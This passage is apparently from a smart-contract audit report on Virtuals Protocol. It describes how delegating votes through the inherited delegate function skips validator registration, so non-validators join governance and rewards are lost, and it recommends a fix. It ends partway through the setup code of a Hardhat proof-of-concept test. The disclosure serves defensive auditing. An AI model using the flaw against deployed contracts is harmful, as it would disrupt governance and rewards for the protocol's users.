<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L13">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L13</a></p>
<h3 style="position:relative;" id="finding-description-8"><a class="anchor before" aria-label="finding description 8 permalink" href="#finding-description-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L59"><code>AgentVeToken::stake</code></a> allows users to stake their tokens in exchange of the power to delegate voting power to a delegatee.
This delegatee can now take part in the governance process via <code>AgentDAO</code> contract.</p>
<p>These delegates are rewarded via <code>AgentReward</code> contract, this is performed via storing the validators during stake.</p>
<pre data-index="81" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">stake</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">totalSupply</span><span class="mtk1">() == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">initialLock</span><span class="mtk1"> = </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">addValidator</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);        &lt;&lt;@ -- </span><span class="mtk3">// Validators are added to the registry every time a stake happens.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_mint</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_delegate</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_balanceCheckpoints</span><span class="mtk1">[</span><span class="mtk12">receiver</span><span class="mtk1">].</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk11">clock</span><span class="mtk1">(), </span><span class="mtk12">SafeCast</span><span class="mtk1">.</span><span class="mtk11">toUint208</span><span class="mtk1">(</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">)));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This registry is used inside the <code>AgentRewardV2</code> and <code>AgentRewardV3</code> contract via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L223"><code>_distributeValidatorRewards</code></a> and <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L308"><code>claimAllValidatorRewards</code></a> respectively. However, there’s a loophole which allows stakers (which includes the founder) to delegate their votes to someone else who is not even a validator. This can be done via the <code>VotesUpgradeable::delegate</code>, the <code>VotesUpgradeable</code> is deeply nested, the way to reach this file is shown below:</p>
<p>(consider <code>-&gt;</code> as <code>inherits</code> keyword)</p>
<pre data-index="82" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">AgentVeToken -&gt; ERC20Votes -&gt; ERC20VotesUpgradeable -&gt; VotesUpgradeable </span></span></code></pre>
<pre data-index="83" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/**</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">     * </span><span class="mtk4">@dev</span><span class="mtk3"> Delegates votes from the sender to </span><span class="mtk8">`delegatee`</span><span class="mtk3">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">     */</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">delegate</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_delegate</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>As we can observe, this functionality by-passes the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133"><code>AgentNftV2::addValidator</code></a> call; hence, allowing a non-validator to be involved in the governance process and at the same time, rewards would lost for both the staker and delegatee.</p>
<h3 style="position:relative;" id="impact-12"><a class="anchor before" aria-label="impact 12 permalink" href="#impact-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ol>
<li>Allows delegation to a non-validator (breaking core functionality).</li>
<li>No validator would be added here to the registry upon <code>VotesUpgradeable::delegate</code> call.</li>
<li>No party here earns any rewards via <code>AgentReward</code> contracts.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-18"><a class="anchor before" aria-label="recommended mitigation steps 18 permalink" href="#recommended-mitigation-steps-18"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Changing delegates via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L59"><code>AgentVeToken::stake</code></a> is sub-optimal, so the recommended solution would be to override the <code>VotesUpgradeable::delegate</code> and modify it to add the <code>addValidator</code> call:</p>
<pre data-index="84" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">delegate</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAgentNft</span><span class="mtk1"> </span><span class="mtk12">registry</span><span class="mtk1"> = </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">agentNft</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1"> = </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">stakingTokenToVirtualId</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">addValidator</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_delegate</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-14"><a class="anchor before" aria-label="proof of concept 14 permalink" href="#proof-of-concept-14"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>The test case below was ran using a base mainnet fork, please add the same to the <code>hardhat.config.js</code> file. The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:</p>
<pre data-index="85" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    "hardhat": "^2.23.0",</span></span></code></pre>
<p>Add the following values to the <code>.env</code> file (along with private keys):</p>
<pre data-index="86" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">### Genesis DAO settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_VOTING_DELAY=0</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_VOTING_PERIOD=900</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_PROPOSAL_THRESHOLD=0</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Virtual DAO settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_VOTING_DELAY=0</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_VOTING_PERIOD=900</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_QUORUM_NUMERATOR=1000</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Other settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">CHAIN_ID=84532</span></span>
<span class="grvsc-line"><span class="grvsc-source">VIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50</span></span>
<span class="grvsc-line"><span class="grvsc-source">VIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V</span></span>
<span class="grvsc-line"><span class="grvsc-source">MATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### AgentToken settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_SUPPLY=1000000000 # 1B supply</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT=1000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_VAULT_SUPPLY=0 #</span></span>
<span class="grvsc-line"><span class="grvsc-source">BOT_PROTECTION=3600 # 1hr</span></span>
<span class="grvsc-line"><span class="grvsc-source">TAX=100 # 3%</span></span>
<span class="grvsc-line"><span class="grvsc-source">BONDING_TAX=1</span></span>
<span class="grvsc-line"><span class="grvsc-source">SWAP_THRESHOLD=1 # 0.00001% of total supply</span></span>
<span class="grvsc-line"><span class="grvsc-source">### VOTING_TOKEN=</span></span>
<span class="grvsc-line"><span class="grvsc-source">TBA_REGISTRY=</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Reward settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">PARENT_SHARES=2000 # 20%</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_SHARES=1000 # 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">CONTRIBUTOR_SHARES=5000 # 50%</span></span>
<span class="grvsc-line"><span class="grvsc-source">STAKER_SHARES=9000 # 90%</span></span>
<span class="grvsc-line"><span class="grvsc-source">REWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth</span></span>
<span class="grvsc-line"><span class="grvsc-source">DATASET_SHARES=7000 # 70%</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### TAX MANAGER</span></span>
<span class="grvsc-line"><span class="grvsc-source">MIN_SWAP_THRESHOLD=100000000000000000 # 0.1</span></span>
<span class="grvsc-line"><span class="grvsc-source">MAX_SWAP_THRESHOLD=1000000000000000000000 # 1000</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">UNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24</span></span></code></pre>
<p>Create a file called <code>PoC.js</code> and add the following test case inside the <code>/tests</code> folder and run <code>npx hardhat test --grep "Delegate a non-validator"</code>:</p>
<details>
<pre data-index="87" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">const { parseEther, toBeHex, formatEther } = require("ethers/utils");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { expect } = require("chai");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const {</span></span>
<span class="grvsc-line"><span class="grvsc-source">  loadFixture,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  mine,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  impersonateAccount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  setBalance,</span></span>
<span class="grvsc-line"><span class="grvsc-source">} = require("@nomicfoundation/hardhat-toolbox/network-helpers");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { ethers } = require("hardhat");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">describe("AgentFactory", () =&gt; {</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const PROPOSAL_THRESHOLD = parseEther("50000"); // 50k</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const MATURITY_SCORE = toBeHex(2000, 32); // 20%</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const IP_SHARE = 1000; // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  const genesisInput = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    name: "Jessica",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    symbol: "JSC",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tokenURI: "http://jessica",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoName: "Jessica DAO",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    cores: [0, 1, 2],</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tbaSalt:</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoVotingPeriod: 600,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoThreshold: 1000000000000000000000n,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  const getAccounts = async () =&gt; {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Fund all accounts with ETH for gas (10 ETH each)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    for (const account of fundAccounts) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await setBalance(account.address, parseEther("10"));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployBaseContracts() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { deployer, ipVault, treasury } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setting up environment variables if not present in the actual .env</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // This is for testing purposes only</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = "1000"; // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = "0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9"; // Base mainnet Uniswap router</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther("10000000").toString(); // 10M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther("5000000").toString(); // 5M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther("2000000").toString(); // 2M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = "100"; // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.TAX) process.env.TAX = "500"; // 5%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther("10").toString(); // 10 tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying VirtualToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const virtualToken = await ethers.deployContract(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "VirtualToken",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [PROPOSAL_THRESHOLD, deployer.address],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`VirtualToken deployed at ${virtualToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ERC6551Registry Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tbaRegistry = await ethers.deployContract("ERC6551Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await tbaRegistry.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deployed ERC6551Registry Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentNftV2...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const AgentNft = await ethers.getContractFactory("AgentNftV2");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentNftV2 deployed at ${agentNft.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ContributionNft...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const contribution = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("ContributionNft"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [agentNft.target],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`ContributionNft deployed at ${contribution.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ServiceNft...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const service = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("ServiceNft"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [agentNft.target, contribution.target, process.env.DATASET_SHARES],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`ServiceNft deployed at ${service.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.setContributionService(contribution.target, service.target);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Set contribution and service on AgentNft");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Implementation contracts</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.deployContract("AgentToken");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentToken deployed at ${agentToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentDAO...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentDAO = await ethers.deployContract("AgentDAO");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentDAO.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentDAO deployed at ${agentDAO.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentVeToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentVeToken = await ethers.deployContract("AgentVeToken");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentVeToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentFactoryV2...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentFactory = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("AgentFactoryV2"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentVeToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentDAO.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tbaRegistry.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        PROPOSAL_THRESHOLD,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        deployer.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Granted MINTER_ROLE to AgentFactory");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying Minter...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const minter = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("Minter"),</span></span>
